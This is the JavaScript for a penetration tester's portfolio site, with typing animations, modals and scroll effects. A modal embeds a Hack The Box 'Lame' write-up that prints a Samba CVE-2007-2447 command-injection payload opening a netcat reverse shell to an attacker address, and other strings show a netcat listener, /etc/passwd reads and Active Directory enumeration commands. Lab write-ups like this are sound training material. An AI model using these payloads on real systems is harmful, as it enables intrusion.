// Main JavaScript functionality
document.addEventListener('DOMContentLoaded', function() {
    // Typing effect for hero section
    const typingText = document.getElementById('typing-text');
    const messages = [
        'root@0xProfound:~# whoami',
        'root@0xProfound:~# cat /etc/passwd | grep root',
        'root@0xProfound:~# python3 exploit.py --target 10.10.10.37',
        'root@0xProfound:~# nc -lvnp 4444',
        'root@0xProfound:~# find / -perm -4000 2>/dev/null',
        'root@0xProfound:~# echo "0xProfound was here" > /root/proof.txt'
    ];
    
    let messageIndex = 0;
    let charIndex = 0;
    let currentMessage = '';
    let isDeleting = false;

    function typeEffect() {
        if (isDeleting) {
            currentMessage = messages[messageIndex].substring(0, charIndex - 1);
            charIndex--;
        } else {
            currentMessage = messages[messageIndex].substring(0, charIndex + 1);
            charIndex++;
        }

        typingText.textContent = currentMessage;

        let typeSpeed = isDeleting ? 30 : 80;

        if (!isDeleting && charIndex === messages[messageIndex].length) {
            typeSpeed = 3000;
            isDeleting = true;
        } else if (isDeleting && charIndex === 0) {
            isDeleting = false;
            messageIndex = (messageIndex + 1) % messages.length;
            typeSpeed = 500;
        }

        setTimeout(typeEffect, typeSpeed);
    }

    setTimeout(typeEffect, 1000);

    // Smooth scrolling
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            document.querySelector(this.getAttribute('href')).scrollIntoView({
                behavior: 'smooth'
            });
        });
    });

    // Modal Functions
    function openModal(contentId) {
        const modal = document.getElementById('modal');
        const modalBody = document.getElementById('modal-body');
        
        const content = {
            'lame': `
                <h2 style="color: var(--primary-color); margin-bottom: 2rem;">HTB Machine: Lame - Complete Writeup</h2>
                <div style="color: var(--text-color); line-height: 1.8;">
                    <h3 style="color: var(--primary-color);">Machine Info</h3>
                    <p><strong>IP:</strong> 10.10.10.3<br>
                    <strong>OS:</strong> Linux<br>
                    <strong>Difficulty:</strong> Easy</p>
                    
                    <h3 style="color: var(--primary-color); margin-top: 2rem;">Reconnaissance</h3>
                    <pre style="background: #000; padding: 1rem; border-radius: 5px; overflow-x: auto;">
nmap -sC -sV 10.10.10.3

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian</pre>
                    
                    <h3 style="color: var(--primary-color); margin-top: 2rem;">Exploitation</h3>
                    <p>The Samba version 3.0.20 is vulnerable to CVE-2007-2447. This allows command injection through username authentication.</p>
                    
                    <pre style="background: #000; padding: 1rem; border-radius: 5px; overflow-x: auto;">
smbclient //10.10.10.3/tmp
smb: \> logon "/=\`nohup nc -e /bin/sh 10.10.14.15 4444\`"</pre>
                    
                    <h3 style="color: var(--primary-color); margin-top: 2rem;">Key Learnings</h3>
                    <ul>
                        <li>Always check for known vulnerabilities in service versions</li>
                        <li>SMB enumeration is crucial for Linux targets</li>
                        <li>Command injection can occur in unexpected places</li>
                    </ul>
                </div>
            `,
            'blog1': `
                <h2 style="color: var(--primary-color); margin-bottom: 2rem;">Advanced Active Directory Enumeration Techniques</h2>
                <div style="color: var(--text-light); margin-bottom: 2rem;">Published 3 days ago</div>
                <div style="color: var(--text-color); line-height: 1.8;">
                    <p>Active Directory environments are the crown jewels of most enterprise networks. Proper enumeration is crucial for understanding the attack surface and identifying privilege escalation paths.</p>
                    
                    <h3 style="color: var(--primary-color); margin-top: 2rem;">BloodHound Integration</h3>
                    <p>BloodHound revolutionizes AD enumeration by visualizing complex relationships:</p>
                    <pre style="background: #000; padding: 1rem; border-radius: 5px;">
# Collect data with SharpHound
.\SharpHound.exe -c All -d domain.com --zipfilename bloodhound_data.zip

# Advanced queries in BloodHound
MATCH (u:User {enabled: true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) 
WHERE NOT u.name STARTS WITH 'KRBTGT' 
RETURN p</pre>
                    
                    <h3 style="color: var(--primary-color); margin-top: 2rem;">PowerView Deep Dive</h3>
                    <p>Custom LDAP queries for comprehensive enumeration...</p>
                    <p><a href="#" style="color: var(--primary-color);">Read full article on my blog →</a></p>
                </div>
            `,
            'blog2': `
                <h2 style="color: var(--primary-color); margin-bottom: 2rem;">Automating HTB Machine Reconnaissance</h2>
                <div style="color: var(--text-light); margin-bottom: 2rem;">Published 1 week ago</div>
                <div style="color: var(--text-color); line-height: 1.8;">
                    <p>After solving 37+ HTB machines, I've developed a comprehensive automation framework that reduces manual enumeration time by 70%.</p>
                    
                    <h3 style="color: var(--primary-color); margin-top: 2rem;">AutoRecon.py Framework</h3>
                    <p>My Python framework includes:</p>
                    <ul>
                        <li>Multi-threaded port scanning with service detection</li>
                        <li>Automated directory busting with multiple wordlists</li>
                        <li>Vulnerability scanning integration</li>
                        <li>Custom report generation</li>
                    </ul>
                    
                    <pre style="background: #000; padding: 1rem; border-radius: 5px;">
python3 autorecon.py -t 10.10.10.37 --full-scan --output ./results/</pre>
                    
                    <p><a href="#" style="color: var(--primary-color);">Download the framework from GitHub →</a></p>
                </div>
            `
        };
        
        modalBody.innerHTML = content[contentId] || '<p style="color: var(--text-color);">Content not available yet. Check back soon!</p>';
        modal.style.display = 'block';
    }

    function closeModal() {
        document.getElementById('modal').style.display = 'none';
    }

    // Close modal when clicking outside
    window.onclick = function(event) {
        const modal = document.getElementById('modal');
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    }

    // Animated counters for stats
    function animateCounters() {
        const counters = document.querySelectorAll('.stat-number');
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    const counter = entry.target;
                    const target = parseInt(counter.textContent);
                    if (!isNaN(target)) {
                        let count = 0;
                        const increment = target / 50;
                        const timer = setInterval(() => {
                            count += increment;
                            if (count >= target) {
                                count = target;
                                clearInterval(timer);
                            }
                            counter.textContent = Math.floor(count);
                        }, 40);
                    }
                }
            });
        });
        
        counters.forEach(counter => observer.observe(counter));
    }

    // Header background change on scroll
    window.addEventListener('scroll', () => {
        const header = document.querySelector('header');
        if (window.scrollY > 100) {
            header.style.background = 'rgba(0, 0, 0, 0.98)';
            header.style.backdropFilter = 'blur(15px)';
        } else {
            header.style.background = 'rgba(0, 0, 0, 0.95)';
            header.style.backdropFilter = 'blur(10px)';
        }
    });

    // Add contact link hover effects
    document.querySelectorAll('section#contact a').forEach(link => {
        link.addEventListener('mouseenter', function() {
            this.style.background = 'rgba(0, 255, 0, 0.1)';
            this.style.transform = 'translateY(-3px)';
            this.style.boxShadow = '0 10px 25px rgba(0, 255, 0, 0.3)';
        });
        
        link.addEventListener('mouseleave', function() {
            this.style.background = 'transparent';
            this.style.transform = 'translateY(0)';
            this.style.boxShadow = 'none';
        });
    });

    // Initialize animations
    setTimeout(() => {
        animateCounters();
    }, 1000);

    // Add loading effect for skill bars
    const observerOptions = {
        threshold: 0.5,
        rootMargin: '0px'
    };

    const skillObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const progressBars = entry.target.querySelectorAll('.skill-progress');
                progressBars.forEach((bar, index) => {
                    setTimeout(() => {
                        bar.style.animation = 'fillSkill 2s ease-out forwards';
                    }, index * 200);
                });
            }
        });
    }, observerOptions);

    document.querySelectorAll('.skill-category').forEach(category => {
        skillObserver.observe(category);
    });

    console.log(`
██████╗ ██╗  ██╗██████╗ ██████╗  ██████╗ ███████╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
██╔═████╗╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔═══██╗██║   ██║████╗  ██║██╔══██╗
██║██╔██║ ╚███╔╝ ██████╔╝██████╔╝██║   ██║█████╗  ██║   ██║██║   ██║██╔██╗ ██║██║  ██║
████╔╝██║ ██╔██╗ ██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██║   ██║██║   ██║██║╚██╗██║██║  ██║
╚██████╔╝██╔╝ ██╗██║     ██║  ██║╚██████╔╝██║     ╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
                                
                        Elite Penetration Tester
                        
    Welcome to 0xProfound's Interactive Portfolio
    
    🎯 37+ HTB Machines Solved
    🔥 DEPI VAPT Track Student  
    💻 Python & Bash Automation
    📚 Comprehensive Documentation
    
    Type 'help' in the terminal above for interactive commands!
    `);
});
